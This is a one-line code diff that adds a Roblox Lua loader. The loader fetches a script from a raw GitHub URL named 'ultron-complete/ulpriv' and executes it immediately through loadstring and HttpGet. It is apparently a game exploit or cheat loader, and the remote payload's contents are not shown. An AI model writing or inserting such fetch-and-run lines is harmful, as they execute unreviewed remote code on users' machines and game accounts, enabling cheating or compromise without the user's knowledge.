@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kyke785/ultron-complete/main/ulpriv"))()
